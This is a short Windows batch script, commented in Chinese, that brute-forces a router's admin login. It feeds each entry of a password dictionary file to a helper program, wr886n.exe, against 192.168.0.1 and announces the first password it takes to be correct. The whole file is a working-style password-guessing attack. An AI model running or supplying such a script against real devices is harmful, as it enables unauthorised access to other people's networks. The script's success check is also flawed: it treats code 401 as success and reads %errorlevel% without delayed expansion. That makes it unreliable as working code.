@echo off
::从文件"密码字典.txt"中读取密码
setlocal enableDelayedExpansion
set sum=0
set ipAddr=192.168.0.1
title 正在向!ipAddr!发送登录密码
for /f "delims=" %%i in (密码字典.txt) do (
	set /a num=sum+1
	echo -------------------------------尝试第!num!个密码--------------------------------
	wr886n.exe %%i !ipAddr!
	set /a sum+=1
	if %errorlevel% == 401 (
		title 路由器的登录密码为%%i
		echo 路由器的登录密码为%%i
		goto FINISH
	) else (
		echo Password %%i is unauthorized
	)
)
title 未检测出路由器的登录密码
:FINISH
echo ------------------------------------完成------------------------------------
echo 共尝试了%sum%个密码
PAUSE
EXIT
